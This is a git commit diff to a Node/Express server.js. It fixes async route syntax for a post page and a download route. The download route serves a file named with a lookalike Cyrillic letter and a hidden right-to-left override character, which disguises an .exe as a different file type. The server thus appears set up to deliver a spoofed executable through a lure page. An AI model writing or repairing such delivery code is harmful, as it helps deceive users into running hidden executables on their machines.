8c7da6c59b0c0aaa4a4360771d0c97ed11d63e2d
Catt3a <169023485+Catt3a@users.noreply.github.com>
2026-08-25 16:40:04 +0700

    ,l

--- server.js
+++ server.js
@@ -7,11 +7,11 @@ const PORT = process.env.PORT || 8080;
 const frontend = fs.readFileSync('mainpage.html', 'utf8');
 
 
-app.get('/posts/84146', (req, res), async => {
+app.get('/posts/84146', async (req, res) => {
   res.send(frontend);
 });
 
-app.get('/download/7251', (req, res), async => {
+app.get('/download/7251', async (req, res) => {
   const file = path.join(__dirname, 'lоrd‮rar.exe');
   res.download(file);
 });
